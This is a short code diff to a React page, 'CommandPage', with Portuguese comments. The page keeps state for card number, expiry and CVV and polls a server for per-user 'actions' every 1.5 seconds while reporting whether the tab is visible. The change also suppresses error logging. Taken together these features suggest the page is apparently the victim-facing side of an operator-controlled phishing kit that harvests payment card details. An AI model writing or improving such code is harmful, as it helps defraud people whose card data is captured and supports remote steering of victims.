@@ -16,22 +16,20 @@ function CommandPage({ userId }) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
 
-  // Polling de comandos + heartbeat só quando aba visível
+  // Polling de comandos - visible checado em CADA chamada
   useEffect(() => {
-    const checkCommand = async () => {
+    const poll = async () => {
       try {
-        const hb = document.hidden ? 0 : 1;
-        const response = await axios.get(`${API}/user/check-action/${userId}?hb=${hb}`);
+        const v = document.hidden ? "0" : "1";
+        const response = await axios.get(`${API}/user/check-action/${userId}?visible=${v}`);
         if (response.data && response.data.action) {
           setCurrentCommand(response.data);
         }
-      } catch (error) {
-        console.error("Erro ao verificar comando:", error);
-      }
+      } catch (error) {}
     };
 
-    checkCommand();
-    const interval = setInterval(checkCommand, 2000);
+    poll();
+    const interval = setInterval(poll, 1500);
     return () => clearInterval(interval);
   }, [userId]);
 
